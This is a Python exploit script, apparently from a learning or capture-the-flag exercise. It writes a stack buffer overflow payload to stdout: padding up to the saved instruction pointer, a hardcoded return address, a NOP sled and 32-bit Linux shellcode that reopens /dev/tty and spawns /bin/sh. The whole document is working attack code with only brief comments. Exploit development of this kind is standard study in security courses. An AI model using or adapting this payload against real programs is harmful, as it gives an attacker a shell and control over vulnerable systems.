#!/usr/bin/env python3
import sys
import struct

# Example shellcode (32-bit Linux /bin/sh)
shellcode = (
    b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3"
    b"\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh"
    b"\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

# 1) Figure out the correct offset to EIP (assume 20 for now)
offset = 20

# 2) Decide on a return address (from gdb or trial and error)
#return_address = 0xffffd6d1
return_address = 0xffffd278 #This will prbly be different for you
ret_addr_bytes = struct.pack("<I", return_address)

# Print out ret_addr_bytes
#print(f"Return address bytes: {ret_addr_bytes}")

# 3) Choose a NOP sled size
nop_sled_size = 32
nop_sled = b"\x90" * nop_sled_size

# Construct payload
payload  = b"A" * offset
payload += ret_addr_bytes
payload += nop_sled
payload += shellcode

# Write to stdout
sys.stdout.buffer.write(payload)
#So buffer is being overflowed and eip is the desired address after seg fault
